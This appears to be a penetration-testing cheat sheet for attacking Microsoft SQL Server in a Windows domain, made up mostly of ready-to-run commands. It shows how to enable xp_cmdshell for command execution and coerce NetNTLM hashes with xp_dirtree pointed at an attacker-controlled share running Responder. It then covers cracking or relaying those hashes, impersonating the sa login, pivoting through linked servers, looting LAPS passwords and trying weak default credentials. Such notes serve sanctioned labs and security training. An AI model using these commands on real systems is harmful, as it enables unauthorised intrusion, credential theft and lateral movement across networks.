## Goal
Log in (found creds or `sa`), read data, run OS commands via `xp_cmdshell`, or capture a NetNTLM hash via `xp_dirtree`. MSSQL(1433) often gives RCE as the service account.

> In a domain, MSSQL is dual-use: log in with domain creds (`-windows-auth`), coerce a NetNTLM hash with `xp_dirtree`, or use the SQL service account's key to forge a **Silver ticket** for the `MSSQL` SPN → [[04_kerberos_advanced_paths]]. Whole-domain loop → [[00_AD_METHODOLOGY]]; AD service index → [[00_AD_SERVICES]].

**Checklist**
- [ ] creds or `sa` login works?
- [ ] `xp_cmdshell` enabled (or can you enable it)?
- [ ] coerce auth with `xp_dirtree` -> Responder?
- [ ] linked servers / impersonation (EXECUTE AS)?

# Commands

### Step 1: Connect
```bash
impacket-mssqlclient -port 1433 corp.local/user:password@$IP -windows-auth
impacket-mssqlclient -port 1433 user:password@$IP        # SQL auth
sqsh -S $IP -U user -P password                          # alt (type 'go' to run)
```

### Step 2: Enumerate DBs
```sql
SELECT name FROM sys.databases;
-- impacket shortcuts:  enum_db  ;  use <db>
SELECT * FROM <db>.dbo.users;
```

### Step 3: RCE via xp_cmdshell
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
-- impacket shortcut:  enable_xp_cmdshell  ;  xp_cmdshell whoami
```

### Step 4: Hash capture (no xp_cmdshell needed)
```bash
sudo responder -I tun0
# in mssql:
EXEC xp_dirtree '\\<YOUR_IP>\share', 1, 1;    -- NetNTLM hash -> Responder
```

### Step 5: Linked servers / impersonation
```sql
EXEC sp_linkedservers;                            -- list linked servers
EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;      -- impersonate
```

### Helpline
```bash
# READING PRIVS: SELECT IS_SRVROLEMEMBER('sysadmin') = 1 -> you're sysadmin -> enable xp_cmdshell for RCE.
#   xp_cmdshell fails/blocked (AV) -> fall back to xp_dirtree to STEAL the service-account NetNTLM hash.
# THE TWO RCE/HASH PATHS:
#   xp_cmdshell 'whoami' (after enabling) = direct command exec as the SQL service account.
#   xp_dirtree '\\<YOU>\x',1,1 + Responder = captured NetNTLMv2 -> hashcat -m 5600, or relay if signing off.
# LOOT: a DB named LAPS/similar -> read tables for the local-admin password. app tables -> creds to reuse.
# ACCESS: default sa often weak (sa:sa, sa:password). use -windows-auth with domain creds.
# linked servers (sp_linkedservers) + EXECUTE AS -> pivot to other DB principals/servers.
```
